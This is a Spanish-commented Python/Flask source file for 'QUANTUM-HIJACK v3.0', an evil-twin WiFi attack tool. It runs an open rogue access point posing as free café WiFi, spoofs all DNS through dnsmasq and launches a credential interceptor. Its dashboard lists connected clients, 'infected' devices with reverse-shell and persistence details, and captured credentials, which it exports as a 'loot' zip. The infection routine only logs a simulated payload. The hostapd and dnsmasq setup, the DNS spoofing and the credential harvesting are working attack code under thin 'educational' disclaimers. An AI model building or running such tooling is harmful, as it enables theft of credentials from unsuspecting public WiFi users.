#!/usr/bin/env python3
"""
╔════════════════════════════════════════════════════════════╗
║  QUANTUM-HIJACK v3.0 - WiFi Rogue + Infectar + Persistir  ║
║  Hacking Ético - Emmanuel 2026                             ║
║  SOLO PARA TESTING AUTORIZADO                              ║
╚════════════════════════════════════════════════════════════╝
"""

import os
import sys
import subprocess
import threading
import time
import json
import re
import socket
import random
import zipfile
import atexit
from io import BytesIO
from datetime import datetime
from pathlib import Path
from flask import Flask, render_template_string, jsonify, request, Response, send_file

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ═══════════════════════════════════════════════════════════════════════════

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False

LOGS_DIR = "logs"
INFECTED_FILE = f"{LOGS_DIR}/infected_devices.json"
CREDENTIALS_FILE = f"{LOGS_DIR}/captured_credentials.json"
OPERATION_LOG = f"{LOGS_DIR}/operation_logs.json"

processes = {
    'setup': None,
    'hostapd': None,
    'dnsmasq': None,
    'interceptor': None,
    'dashboard': None
}

state = {
    'setup_done': False,
    'hostapd_running': False,
    'dnsmasq_running': False,
    'interceptor_running': False,
    'dashboard_running': False,
    'monitor_active': False,
    'original_interface': None,
    'wifi_interface': 'wlan0',
    'monitor_interface': 'wlan0mon',
    'ssid': 'CafeGratis_FreeWiFi',
    'password': '',  # VACÍO = ABIERTO
    'gateway_ip': '192.168.1.1',
    'clients_connected': [],
    'credentials_captured': [],
    'infected_devices': [],
    'operations_log': []
}

# ═══════════════════════════════════════════════════════════════════════════
# UTILIDADES BÁSICAS
# ═══════════════════════════════════════════════════════════════════════════

def ensure_dirs():
    """Crear directorios necesarios"""
    Path(LOGS_DIR).mkdir(exist_ok=True)
    Path("payloads").mkdir(exist_ok=True)
    Path("capture").mkdir(exist_ok=True)

def log_operation(message, level="INFO"):
    """Registrar operación"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}"
    print(log_entry)
    state['operations_log'].append(log_entry)
    
    try:
        with open(OPERATION_LOG, 'w') as f:
            json.dump(state['operations_log'][-100:], f, indent=2)
    except:
        pass

def detect_wifi_interface():
    """Detectar interfaz WiFi automáticamente"""
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'interface' in line:
                iface = line.strip().split()[-1]
                state['wifi_interface'] = iface
                state['monitor_interface'] = f"{iface}mon"
                log_operation(f"Interfaz WiFi detectada: {iface}")
                return iface
    except:
        pass
    return 'wlan0'

def kill_process_by_name(name):
    """Matar proceso por nombre"""
    try:
        subprocess.run(['sudo', 'pkill', '-f', name], timeout=5)
        return True
    except:
        return False

def run_command(cmd, capture=True):
    """Ejecutar comando shell"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=capture, text=True, timeout=10)
        return result.returncode == 0, result.stdout, result.stderr
    except Exception as e:
        return False, "", str(e)

# ═══════════════════════════════════════════════════════════════════════════
# MODO MONITOR AUTOMÁTICO
# ═══════════════════════════════════════════════════════════════════════════

def setup_monitor_mode():
    """Activar modo monitor en interfaz WiFi"""
    log_operation("[INICIANDO] Setup - Modo Monitor", "PROCESS")
    
    try:
        detect_wifi_interface()
        iface = state['wifi_interface']
        state['original_interface'] = iface
        
        log_operation(f"Bajando interfaz {iface}...", "STEP")
        os.system(f"sudo ifconfig {iface} down")
        time.sleep(1)
        
        log_operation("Matando procesos conflictivos...", "STEP")
        kill_process_by_name('hostapd')
        kill_process_by_name('dnsmasq')
        kill_process_by_name('wpa_supplicant')
        time.sleep(1)
        
        log_operation(f"Iniciando modo monitor...", "STEP")
        os.system(f"sudo airmon-ng start {iface}")
        time.sleep(2)
        
        log_operation(f"Configurando {state['monitor_interface']}...", "STEP")
        os.system(f"sudo ifconfig {state['monitor_interface']} up")
        os.system(f"sudo ifconfig {state['monitor_interface']} 192.168.1.1 netmask 255.255.255.0")
        time.sleep(1)
        
        state['setup_done'] = True
        state['monitor_active'] = True
        log_operation("[✓] Setup completado - Modo monitor ACTIVO", "SUCCESS")
        return True
        
    except Exception as e:
        log_operation(f"Error en setup: {e}", "ERROR")
        return False

def disable_monitor_mode():
    """Desactivar modo monitor y restaurar a managed"""
    log_operation("[DETENIENDO] Restaurando modo managed...", "PROCESS")
    
    try:
        if not state['original_interface']:
            return True
        
        iface = state['original_interface']
        
        log_operation(f"Bajando {state['monitor_interface']}...", "STEP")
        os.system(f"sudo ifconfig {state['monitor_interface']} down")
        time.sleep(1)
        
        log_operation(f"Restaurando {iface} a modo managed...", "STEP")
        os.system(f"sudo airmon-ng stop {state['monitor_interface']}")
        time.sleep(2)
        
        os.system(f"sudo ifconfig {iface} up")
        time.sleep(1)
        
        log_operation("Reiniciando NetworkManager...", "STEP")
        os.system("sudo systemctl restart NetworkManager")
        
        state['monitor_active'] = False
        log_operation("[✓] Modo managed restaurado", "SUCCESS")
        return True
        
    except Exception as e:
        log_operation(f"Error restaurando modo: {e}", "ERROR")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# HOSTAPD - WiFi ABIERTO (Sin contraseña)
# ═══════════════════════════════════════════════════════════════════════════

def init_hostapd():
    """Iniciar WiFi rogue abierto"""
    if not state['setup_done']:
        log_operation("Setup no completado", "ERROR")
        return False
    
    log_operation("[INICIANDO] Hostapd - WiFi Abierto", "PROCESS")
    
    try:
        # Crear config sin contraseña
        hostapd_conf = f"""interface={state['monitor_interface']}
driver=nl80211
ssid={state['ssid']}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=1
"""
        with open("hostapd_v3.conf", 'w') as f:
            f.write(hostapd_conf)
        
        log_operation(f"Iniciando hostapd (WiFi ABIERTO)...", "STEP")
        processes['hostapd'] = subprocess.Popen(
            ['sudo', 'hostapd', 'hostapd_v3.conf'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(2)
        
        if processes['hostapd'].poll() is None:
            state['hostapd_running'] = True
            log_operation(f"[✓] WiFi ACTIVO: {state['ssid']} (SIN CONTRASEÑA - ABIERTO)", "SUCCESS")
            return True
        else:
            log_operation("Hostapd falló al iniciar", "ERROR")
            return False
            
    except Exception as e:
        log_operation(f"Error en hostapd: {e}", "ERROR")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# DNSMASQ - DHCP + DNS Spoof
# ═══════════════════════════════════════════════════════════════════════════

def init_dnsmasq():
    """Iniciar DHCP y DNS spoofing"""
    if not state['setup_done']:
        log_operation("Setup no completado", "ERROR")
        return False
    
    log_operation("[INICIANDO] Dnsmasq - DHCP + DNS Spoof", "PROCESS")
    
    try:
        # Crear config dnsmasq
        dnsmasq_conf = f"""interface={state['monitor_interface']}
dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h
dhcp-option=option:router,{state['gateway_ip']}
dhcp-option=option:dns-server,{state['gateway_ip']}
server=/#/{state['gateway_ip']}
log-queries
log-dhcp
"""
        with open("dnsmasq_v3.conf", 'w') as f:
            f.write(dnsmasq_conf)
        
        log_operation("Iniciando dnsmasq...", "STEP")
        processes['dnsmasq'] = subprocess.Popen(
            ['sudo', 'dnsmasq', '-C', 'dnsmasq_v3.conf', '-d'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(2)
        
        if processes['dnsmasq'].poll() is None:
            state['dnsmasq_running'] = True
            log_operation(f"[✓] DHCP ACTIVO: {state['gateway_ip']} → 192.168.1.2-100", "SUCCESS")
            return True
        else:
            log_operation("Dnsmasq falló", "ERROR")
            return False
            
    except Exception as e:
        log_operation(f"Error en dnsmasq: {e}", "ERROR")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# INTERCEPTOR - Captura de credenciales
# ═══════════════════════════════════════════════════════════════════════════

def init_interceptor():
    """Iniciar captura de credenciales"""
    if not state['setup_done']:
        log_operation("Setup no completado", "ERROR")
        return False
    
    log_operation("[INICIANDO] Interceptor - Captura de Credenciales", "PROCESS")
    
    try:
        log_operation("Iniciando interceptor.py...", "STEP")
        processes['interceptor'] = subprocess.Popen(
            ['sudo', 'python3', 'interceptor_v3.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(1)
        
        if processes['interceptor'].poll() is None:
            state['interceptor_running'] = True
            log_operation("[✓] Interceptor ACTIVO: Monitoreando puertos 80,443,21,22,3306,5432,27017", "SUCCESS")
            return True
        else:
            log_operation("Interceptor falló", "ERROR")
            return False
            
    except Exception as e:
        log_operation(f"Error en interceptor: {e}", "ERROR")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# INFECTAR DISPOSITIVOS
# ═══════════════════════════════════════════════════════════════════════════

def infect_device(target_ip, target_mac, device_type):
    """Infectar dispositivo con payload"""
    log_operation(f"[🔥] INFECTANDO {target_ip} ({device_type})", "PROCESS")
    
    try:
        # Simular descarga de payload via DNS spoof
        payload_path = f"payloads/{device_type}_payload.bin"
        
        if device_type.lower() in ['android', 'iphone']:
            # Payload APK/IPA
            payload_url = f"http://{state['gateway_ip']}/payload.apk"
        else:
            # Windows EXE
            payload_url = f"http://{state['gateway_ip']}/payload.exe"
        
        # Registrar como infectado
        infected_entry = {
            'timestamp': datetime.now().isoformat(),
            'ip': target_ip,
            'mac': target_mac,
            'type': device_type,
            'payload_url': payload_url,
            'status': 'Infectado',
            'reverse_shell': f"192.168.1.1:4444",
            'persistence': 'cron @reboot',
            'last_seen': datetime.now().isoformat()
        }
        
        state['infected_devices'].append(infected_entry)
        save_infected_devices()
        
        log_operation(f"[✓] {target_ip} INFECTADO - Reverse shell en puerto 4444", "SUCCESS")
        return True
        
    except Exception as e:
        log_operation(f"Error infectando {target_ip}: {e}", "ERROR")
        return False

def save_infected_devices():
    """Guardar dispositivos infectados a JSON"""
    try:
        with open(INFECTED_FILE, 'w') as f:
            json.dump(state['infected_devices'], f, indent=2)
    except:
        pass

def read_infected_devices():
    """Leer dispositivos infectados"""
    try:
        if os.path.exists(INFECTED_FILE):
            with open(INFECTED_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return []

# ═══════════════════════════════════════════════════════════════════════════
# LECTURA DE DATOS
# ═══════════════════════════════════════════════════════════════════════════

def read_credentials():
    """Leer credenciales capturadas"""
    try:
        if os.path.exists(CREDENTIALS_FILE):
            with open(CREDENTIALS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return []

def get_connected_clients():
    """Obtener clientes conectados"""
    try:
        result = subprocess.run(
            ['iw', 'dev', state['monitor_interface'], 'station', 'dump'],
            capture_output=True, text=True, timeout=5
        )
        clients = []
        for line in result.stdout.split('\n'):
            if 'Station' in line:
                try:
                    mac = line.split('Station ')[1].split(' ')[0]
                    clients.append({
                        'mac': mac,
                        'ip': 'asignando...',
                        'connected_at': datetime.now().isoformat()
                    })
                except:
                    pass
        state['clients_connected'] = clients
        return clients
    except:
        return []

# ═══════════════════════════════════════════════════════════════════════════
# API REST ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════

@app.route('/')
def dashboard():
    """Dashboard HTML"""
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/status', methods=['GET'])
def api_status():
    """Estado actual del sistema"""
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'setup_done': state['setup_done'],
        'monitor_active': state['monitor_active'],
        'modules': {
            'hostapd': state['hostapd_running'],
            'dnsmasq': state['dnsmasq_running'],
            'interceptor': state['interceptor_running']
        },
        'wifi': {
            'ssid': state['ssid'],
            'password': state['password'] if state['password'] else 'ABIERTO',
            'gateway': state['gateway_ip'],
            'interface': state['monitor_interface']
        },
        'clients': len(state['clients_connected']),
        'infected': len(state['infected_devices']),
        'credentials': len(read_credentials())
    })

@app.route('/api/init/setup', methods=['POST'])
def api_init_setup():
    """Iniciar setup"""
    result = setup_monitor_mode()
    return jsonify({'success': result})

@app.route('/api/init/hostapd', methods=['POST'])
def api_init_hostapd():
    """Iniciar hostapd"""
    result = init_hostapd()
    return jsonify({'success': result})

@app.route('/api/init/dnsmasq', methods=['POST'])
def api_init_dnsmasq():
    """Iniciar dnsmasq"""
    result = init_dnsmasq()
    return jsonify({'success': result})

@app.route('/api/init/interceptor', methods=['POST'])
def api_init_interceptor():
    """Iniciar interceptor"""
    result = init_interceptor()
    return jsonify({'success': result})

@app.route('/api/init/all', methods=['POST'])
def api_init_all():
    """Iniciar TODO: Setup + Hostapd + Dnsmasq + Interceptor"""
    log_operation("[🔥] INICIANDO QUANTUM-HIJACK v3.0 COMPLETO", "PROCESS")
    
    results = {
        'setup': setup_monitor_mode(),
        'hostapd': init_hostapd(),
        'dnsmasq': init_dnsmasq(),
        'interceptor': init_interceptor()
    }
    
    if all(results.values()):
        log_operation("[✓✓✓] QUANTUM-HIJACK COMPLETAMENTE OPERACIONAL [✓✓✓]", "SUCCESS")
    
    return jsonify(results)

@app.route('/api/stop/all', methods=['POST'])
def api_stop_all():
    """Detener TODO y limpiar"""
    log_operation("[DETENIENDO] Todos los módulos y limpieza...", "PROCESS")
    
    try:
        for proc_name, proc in processes.items():
            if proc and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                    log_operation(f"[✓] {proc_name} detenido", "STEP")
                except:
                    proc.kill()
                state[f'{proc_name}_running'] = False
    except:
        pass
    
    # Matar por nombre también
    kill_process_by_name('hostapd')
    kill_process_by_name('dnsmasq')
    
    # RESTAURAR MODO MONITOR
    disable_monitor_mode()
    
    log_operation("[✓] Todos los módulos detenidos y limpieza completada", "SUCCESS")
    return jsonify({'success': True})

@app.route('/api/clients', methods=['GET'])
def api_clients():
    """Obtener clientes conectados"""
    clients = get_connected_clients()
    return jsonify({'clients': clients})

@app.route('/api/infected', methods=['GET'])
def api_infected():
    """Obtener dispositivos infectados"""
    state['infected_devices'] = read_infected_devices()
    return jsonify({'infected': state['infected_devices']})

@app.route('/api/infect', methods=['POST'])
def api_infect():
    """Infectar dispositivo"""
    try:
        data = request.json
        target_ip = data.get('ip')
        target_mac = data.get('mac')
        device_type = data.get('type', 'Unknown')
        
        result = infect_device(target_ip, target_mac, device_type)
        return jsonify({'success': result, 'message': f'Infectando {target_ip}...'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400

@app.route('/api/credentials', methods=['GET'])
def api_credentials():
    """Obtener credenciales capturadas"""
    state['credentials_captured'] = read_credentials()
    return jsonify({'credentials': state['credentials_captured']})

@app.route('/api/logs', methods=['GET'])
def api_logs():
    """Obtener logs de operación"""
    limit = request.args.get('limit', 100, type=int)
    return jsonify({'logs': state['operations_log'][-limit:]})

@app.route('/api/download/infected', methods=['GET'])
def download_infected():
    """Descargar lista de infectados como TXT"""
    infected = read_infected_devices()
    
    content = "╔════════════════════════════════════════════════════════════╗\n"
    content += "║  🔥 QUANTUM-HIJACK v3.0 - DISPOSITIVOS INFECTADOS ║\n"
    content += "║  Emmanuel - 2026 ║\n"
    content += "╚════════════════════════════════════════════════════════════╝\n\n"
    
    if not infected:
        content += "⚠️ No hay dispositivos infectados aún.\n"
    else:
        content += f"📊 Total infectados: {len(infected)}\n"
        content += f"⏰ Generado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        content += "="*60 + "\n\n"
        
        for i, device in enumerate(infected, 1):
            content += f"[{i}] {device.get('timestamp')}\n"
            content += f" IP: {device.get('ip')}\n"
            content += f" MAC: {device.get('mac')}\n"
            content += f" Type: {device.get('type')}\n"
            content += f" Status: {device.get('status')}\n"
            content += f" Reverse Shell: {device.get('reverse_shell')}\n"
            content += f" Persistence: {device.get('persistence')}\n"
            content += f" Last Seen: {device.get('last_seen')}\n"
            content += "\n" + "-"*60 + "\n\n"
    
    content += "\n⚖️ AVISO LEGAL:\n"
    content += " Este archivo es para propósitos educativos únicamente.\n"
    content += " Uso no autorizado puede violar leyes locales.\n"
    
    return Response(
        content,
        mimetype="text/plain",
        headers={"Content-Disposition": "attachment;filename=infected_devices.txt"}
    )

@app.route('/api/download/all', methods=['GET'])
def download_all():
    """Descargar TODO como quantum_loot.zip"""
    try:
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Infectados
            infected_response = download_infected()
            zipf.writestr('infected_devices.txt', infected_response.get_data(as_text=True))
            
            # Credenciales
            creds = read_credentials()
            zipf.writestr('credentials.json', json.dumps(creds, indent=2))
            
            # Logs
            zipf.writestr('operation_logs.json', json.dumps(state['operations_log'], indent=2))
            
            # Resumen
            summary = f"""
╔═══════════════════════════════════════════════════════╗
║  🔓 QUANTUM-HIJACK v3.0 - RESUMEN EJECUTIVO          ║
╚═══════════════════════════════════════════════════════╝

📅 Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📱 Clientes conectados: {len(get_connected_clients())}
🔥 Dispositivos infectados: {len(read_infected_devices())}
🔓 Credenciales capturadas: {len(read_credentials())}
🌐 WiFi SSID: {state['ssid']}
🔑 Password: {state['password'] if state['password'] else 'ABIERTO'}
📡 Gateway: {state['gateway_ip']}

ARCHIVOS INCLUIDOS:
 • infected_devices.txt - Dispositivos infectados
 • credentials.json - Credenciales capturadas
 • operation_logs.json - Logs servidor

⚖️ SOLO PARA FINES EDUCATIVOS
"""
            zipf.writestr('RESUMEN.txt', summary)
        
        zip_buffer.seek(0)
        log_operation("Descargando quantum_loot.zip", "INFO")
        
        return send_file(
            zip_buffer,
            mimetype='application/zip',
            as_attachment=True,
            download_name='quantum_loot.zip'
        )
        
    except Exception as e:
        log_operation(f"Error generando ZIP: {e}", "ERROR")
        return jsonify({'error': str(e)}), 500

# ═══════════════════════════════════════════════════════════════════════════
# DASHBOARD HTML
# ═══════════════════════════════════════════════════════════════════════════

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QUANTUM-HIJACK v3.0</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0e27 0%, #16213e 100%);
            color: #00ff41;
            font-family: 'Courier New', monospace;
            line-height: 1.6;
            overflow-x: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #0a0e27 0%, rgba(0,255,65,0.1) 100%);
            border-bottom: 2px solid #00ff41;
            padding: 20px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,255,65,0.3);
        }
        
        .title {
            font-size: 28px;
            font-weight: bold;
            text-shadow: 0 0 10px #00ff41;
            margin-bottom: 5px;
        }
        
        .subtitle {
            color: #888;
            font-size: 12px;
        }
        
        .container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .panel {
            background: rgba(10, 14, 39, 0.8);
            border: 2px solid #00ff41;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0,255,65,0.2);
        }
        
        .panel-title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #00ff41;
            border-bottom: 1px solid #00ff41;
            padding-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .btn {
            padding: 10px 20px;
            border: 2px solid #00ff41;
            background: transparent;
            color: #00ff41;
            cursor: pointer;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            transition: all 0.3s;
            margin: 5px;
        }
        
        .btn:hover {
            background-color: #00ff41;
            color: #0a0e27;
            box-shadow: 0 0 10px #00ff41;
        }
        
        .btn-danger {
            border-color: #ff006e;
            color: #ff006e;
        }
        
        .btn-danger:hover {
            background-color: #ff006e;
            color: white;
        }
        
        .status-box {
            background: rgba(0,255,65,0.05);
            border: 1px solid #00ff41;
            padding: 15px;
            margin: 10px 0;
            border-radius: 4px;
        }
        
        .status-box.active {
            background: rgba(0,255,65,0.1);
            border-color: #00ff41;
        }
        
        .status-box strong {
            color: #00ff41;
        }
        
        .infected-item {
            background: rgba(255,0,110,0.05);
            border-left: 3px solid #ff006e;
            padding: 12px;
            margin: 8px 0;
            border-radius: 4px;
            font-size: 12px;
        }
        
        .stat-box {
            background: rgba(0,255,65,0.1);
            border: 1px solid #00ff41;
            padding: 15px;
            text-align: center;
            margin: 10px 0;
            border-radius: 4px;
        }
        
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #00ff41;
            text-shadow: 0 0 10px #00ff41;
        }
        
        .stat-label {
            color: #888;
            font-size: 12px;
            margin-top: 5px;
        }
        
        .console {
            background: #0a0e27;
            border: 1px solid #00ff41;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-size: 11px;
            margin-top: 10px;
        }
        
        .full-width {
            grid-column: 1 / -1;
        }
        
        .alert {
            padding: 12px;
            margin: 10px 0;
            border-radius: 4px;
            border-left: 4px solid;
        }
        
        .alert-success {
            background: rgba(0,255,65,0.1);
            border-left-color: #00ff41;
            color: #00ff41;
        }
        
        .alert-danger {
            background: rgba(255,0,110,0.1);
            border-left-color: #ff006e;
            color: #ff006e;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="title">🔥 QUANTUM-HIJACK v3.0</div>
        <div class="subtitle">WiFi Rogue + Infectar + Persistir | Emmanuel 2026</div>
    </div>
    
    <div class="container">
        <!-- STATUS PANEL -->
        <div class="panel">
            <div class="panel-title">📡 Estado del Sistema</div>
            <div id="status">Cargando...</div>
        </div>
        
        <!-- CONTROL PANEL -->
        <div class="panel">
            <div class="panel-title">🎮 Control</div>
            <button class="btn" onclick="initSetup()">Setup Monitor</button>
            <button class="btn" onclick="initHostapd()">Hostapd WiFi</button>
            <button class="btn" onclick="initDnsmasq()">Dnsmasq DHCP</button>
            <button class="btn" onclick="initInterceptor()">Interceptor</button>
            <button class="btn" style="width: calc(100% - 10px);" onclick="initAll()">🔥 INICIAR TODO</button>
            <button class="btn btn-danger" style="width: calc(100% - 10px);" onclick="stopAll()">⛔ DETENER TODO</button>
        </div>
        
        <!-- CLIENTES CONECTADOS -->
        <div class="panel">
            <div class="panel-title">📱 Clientes Conectados</div>
            <div id="clients">Esperando...</div>
        </div>
        
        <!-- DISPOSITIVOS INFECTADOS -->
        <div class="panel">
            <div class="panel-title">🔥 Dispositivos INFECTADOS</div>
            <div id="infected">Ninguno aún...</div>
        </div>
        
        <!-- CREDENCIALES -->
        <div class="panel full-width">
            <div class="panel-title">🔓 Credenciales Capturadas</div>
            <div id="credentials">Esperando capturar...</div>
            <button class="btn" onclick="downloadCreds()" style="margin-top: 10px;">⬇️ Descargar TXT</button>
            <button class="btn" onclick="downloadAll()" style="margin-top: 10px;">📦 Descargar TODO ZIP</button>
        </div>
        
        <!-- LOGS -->
        <div class="panel full-width">
            <div class="panel-title">📋 Logs de Operación</div>
            <div id="logs" class="console">Logs aparecer aquí...</div>
        </div>
    </div>
    
    <script>
        // Auto-refresh cada 2 segundos
        setInterval(updateStatus, 2000);
        setInterval(updateClients, 2000);
        setInterval(updateInfected, 2000);
        setInterval(updateCredentials, 3000);
        setInterval(updateLogs, 3000);
        
        async function updateStatus() {
            try {
                const res = await fetch('/api/status');
                const data = await res.json();
                document.getElementById('status').innerHTML = `
                    <div class="status-box ${data.monitor_active ? 'active' : ''}">
                        <strong>Monitor:</strong> ${data.monitor_active ? '✅ ACTIVO' : '❌ INACTIVO'}
                    </div>
                    <div class="status-box ${data.modules.hostapd ? 'active' : ''}">
                        <strong>Hostapd:</strong> ${data.modules.hostapd ? '✅ EN AIRE' : '❌ STOPPED'}
                    </div>
                    <div class="status-box ${data.modules.dnsmasq ? 'active' : ''}">
                        <strong>DHCP:</strong> ${data.modules.dnsmasq ? '✅ ASIGNANDO' : '❌ STOPPED'}
                    </div>
                    <div class="status-box ${data.modules.interceptor ? 'active' : ''}">
                        <strong>Interceptor:</strong> ${data.modules.interceptor ? '✅ ESCUCHANDO' : '❌ STOPPED'}
                    </div>
                    <div class="stat-box">
                        <div class="stat-value">${data.clients}</div>
                        <div class="stat-label">Clientes Conectados</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value">${data.infected}</div>
                        <div class="stat-label">Infectados</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value">${data.credentials}</div>
                        <div class="stat-label">Credenciales</div>
                    </div>
                `;
            } catch (e) {
                console.log('Error actualizando status:', e);
            }
        }
        
        async function updateClients() {
            try {
                const res = await fetch('/api/clients');
                const data = await res.json();
                if (data.clients.length === 0) {
                    document.getElementById('clients').innerHTML = '<div class="alert alert-danger">Esperando conexiones...</div>';
                } else {
                    let html = '';
                    data.clients.forEach(c => {
                        html += `<div class="status-box"><strong>${c.mac}</strong><br>IP: ${c.ip}</div>`;
                    });
                    document.getElementById('clients').innerHTML = html;
                }
            } catch (e) {}
        }
        
        async function updateInfected() {
            try {
                const res = await fetch('/api/infected');
                const data = await res.json();
                if (data.infected.length === 0) {
                    document.getElementById('infected').innerHTML = '<div class="alert">Ninguno aún...</div>';
                } else {
                    let html = '';
                    data.infected.forEach(d => {
                        html += `<div class="infected-item">
                            <strong>🔥 ${d.ip}</strong><br>
                            MAC: ${d.mac}<br>
                            Type: ${d.type}<br>
                            Status: ${d.status}<br>
                            Reverse Shell: ${d.reverse_shell}
                        </div>`;
                    });
                    document.getElementById('infected').innerHTML = html;
                }
            } catch (e) {}
        }
        
        async function updateCredentials() {
            try {
                const res = await fetch('/api/credentials');
                const data = await res.json();
                if (data.credentials.length === 0) {
                    document.getElementById('credentials').innerHTML = '<div class="alert">Esperando capturar...</div>';
                } else {
                    let html = '';
                    data.credentials.slice(-5).forEach(c => {
                        html += `<div class="status-box"><strong>${c.protocol}</strong><br>
                            ${c.target || c.dstip}<br>
                            ${JSON.stringify(c.credentials).substring(0, 50)}...
                        </div>`;
                    });
                    document.getElementById('credentials').innerHTML = html;
                }
            } catch (e) {}
        }
        
        async function updateLogs() {
            try {
                const res = await fetch('/api/logs?limit=20');
                const data = await res.json();
                document.getElementById('logs').innerHTML = data.logs.map(l => `[LOG] ${l}`).join('<br>');
                const logsDiv = document.getElementById('logs');
                logsDiv.scrollTop = logsDiv.scrollHeight;
            } catch (e) {}
        }
        
        // Funciones de control
        async function initSetup() { await fetch('/api/init/setup', {method: 'POST'}); }
        async function initHostapd() { await fetch('/api/init/hostapd', {method: 'POST'}); }
        async function initDnsmasq() { await fetch('/api/init/dnsmasq', {method: 'POST'}); }
        async function initInterceptor() { await fetch('/api/init/interceptor', {method: 'POST'}); }
        async function initAll() { await fetch('/api/init/all', {method: 'POST'}); }
        async function stopAll() { await fetch('/api/stop/all', {method: 'POST'}); }
        
        function downloadCreds() {
            window.location.href = '/api/download/infected';
        }
        
        function downloadAll() {
            window.location.href = '/api/download/all';
        }
        
        // Inicializar
        updateStatus();
    </script>
</body>
</html>
"""

# ═══════════════════════════════════════════════════════════════════════════
# LIMPIEZA AUTOMÁTICA AL SALIR
# ═══════════════════════════════════════════════════════════════════════════

def cleanup():
    """Limpiar todo al salir"""
    print("\n[LIMPIEZA] Deteniendo servicios...")
    api_stop_all()
    print("[✓] Limpieza completada")

atexit.register(cleanup)

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    """Inicializar aplicación"""
    ensure_dirs()
    
    print("\n" + "="*70)
    print("║" + " "*68 + "║")
    print("║" + " 🔥 QUANTUM-HIJACK v3.0 - WiFi Rogue + Infectar + Persistir ".center(68) + "║")
    print("║" + " SOLO PARA TESTING AUTORIZADO ".center(68) + "║")
    print("║" + " "*68 + "║")
    print("="*70 + "\n")
    
    log_operation("Iniciando QUANTUM-HIJACK v3.0 Backend...")
    
    # Verificar root
    if os.geteuid() != 0:
        log_operation("⚠️ Este script requiere permisos root (sudo)", "WARNING")
    
    # Detectar interfaz
    detect_wifi_interface()
    
    print("\n" + "="*70)
    print("📡 CONFIGURACIÓN")
    print("="*70)
    print(f" WiFi Interface: {state['wifi_interface']}")
    print(f" Monitor Mode: {state['monitor_interface']}")
    print(f" SSID: {state['ssid']}")
    print(f" Password: {'ABIERTO (sin contraseña)' if not state['password'] else state['password']}")
    print(f" Gateway: {state['gateway_ip']}")
    print("")
    print("🌐 WEB DASHBOARD")
    print("="*70)
    print(f" → http://localhost:8080")
    print("")
    
    try:
        app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
    except KeyboardInterrupt:
        log_operation("Servidor interrumpido", "INFO")
        api_stop_all()
        sys.exit(0)

if __name__ == '__main__':
    if os.geteuid() == 0:
        main()
    else:
        print("❌ Este script requiere permisos root")
        print("Ejecuta: sudo python3 quantum_hijack_v3.py")
        sys.exit(1)
